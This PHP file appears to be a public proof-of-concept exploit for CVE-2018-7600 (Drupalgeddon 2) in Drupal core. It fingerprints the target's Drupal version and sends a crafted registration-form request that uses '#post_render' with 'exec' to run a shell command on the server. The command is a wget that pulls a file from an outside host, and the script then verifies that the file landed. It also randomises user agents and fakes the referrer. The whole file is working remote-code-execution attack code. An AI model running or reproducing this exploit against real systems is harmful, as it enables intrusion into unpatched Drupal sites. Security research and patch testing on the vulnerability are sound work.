<?php
namespace dwisiswant0\CVE_2018_7600;

require_once __DIR__ . "/../vendor/autoload.php";
use \Curl\Curl;

/**
* CVE-2018-7600
* PoC for CVE-2018-7600 Drupal SA-CORE-2018-002 (Drupalgeddon 2).
*
* @category   Library
* @package    dwisiswant0/CVE-2018-7600
* @author     dw1 <iam@dw1.co>
* @link       https://github.com/dwisiswant0/CVE-2018-7600
*/

class main {
	public function __construct() {
		$this->REPO = str_replace(array("\/", "_"), array("/", "-"), __NAMESPACE__);
		$this->exec = new Curl();
	}

	public function exploit($uri, $ssl = FALSE) {
		if ($this->validate($uri)) {
			$parse 	 = parse_url($uri);
			$version = $this->checkVersion($uri);
			echo "  Version: " . ($version === FALSE ? "Unknown" : $version) . "\n\n";
			$ssl	 = (bool) ($parse['scheme'] === "https" ? TRUE : FALSE);
			$target  = (string) ($ssl ? "https" : "http") . "://" . $parse['host'] . str_replace("\/user\/", "", @$parse['path']) . "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
			$output  = "hello.txt";
			$payload = array(
				'form_id'			   => 'user_register_form',
				'_drupal_ajax'		   => '1',
				'mail[#post_render][]' => 'exec',
				'mail[#type]' 		   => 'markup',
				'mail[#markup]'		   => 'wget "https://raw.githubusercontent.com/' . $this->REPO . '/master/hello.txt" -O "' . $output . '"'
			);
			echo "  Exploiting...";
			$this->exec->setUserAgent(random_uagent());
			$this->exec->setReferrer(($ssl ? "https" : "https") . "://" . $parse['host'] . "/user/register?destination=node/");
			$this->exec->setHeader("X-Requested-With", "XMLHttpRequest");
			$this->exec->setOpt(CURLOPT_FOLLOWLOCATION, TRUE);
			$this->exec->post($target, $payload);
			if ($this->exec->error) {
				throw new \Exception("Error while exploit! " . $this->exec->errorCode . ": " . $this->exec->errorMessage, 1);
			} else {
				$code = $this->convertStatus($this->exec->responseHeaders['status-line']);
				echo "\n  Response: " . ($code === 200 ? "VULNERABLE!" : "Not Vuln!") . "\n";
				if ($code === 200) {
					$result = $parse['scheme'] . "://" . $parse['host'] . "/" . $output;
					echo "\n  Check result...";
					$this->exec->setUserAgent(random_uagent());
					$this->exec->get($result);
					if ($this->exec->error) {
						echo "\n  " . $this->exec->errorCode . " FAILED!";
					} else {
						$code = $this->convertStatus($this->exec->responseHeaders['status-line']);
						echo "\n" . ($code === 200 ? "  " . $result . " OK!" : $code . "FAILED!\n");
					}
				}
			}
			exit("\n\n");
		}
	}

	private function validate($uri) {
		if (!preg_match("/^(?:https?:\/\/)?(?:[a-z0-9-]+\.)*((?:[a-z0-9-]+\.)[a-z]+)/", $uri)) {
			throw new \Exception("Invalid target uri!", 1);
		} else {
			return true;
		}
	}

	private function checkVersion($uri, $version = NULL) {
		$parse = parse_url($uri);
		$this->exec->setUserAgent(random_uagent());
		$this->exec->get($parse['scheme'] . "://" . $parse['host'] . "/user");
		if ($this->exec->error) {
			throw new \Exception("Error while check version! " . $this->exec->errorCode . ": " . $this->exec->errorMessage, 1);
		} else {
			$version = $this->exec->responseHeaders['x-generator'];
			if ($version !== NULL || !(empty($version)) || isset($version)) {
				return $version;
			} else {
				return FALSE;
			}
		}
	}

	private function convertStatus($line) {
		preg_match_all("/^HTTP\/(\d\.\d) ([0-9][0-9][0-9]) (.*?)/", $line, $matches);
		$code = (int) @$matches[2][0];
		return (!$code ? FALSE : $code);
	}
}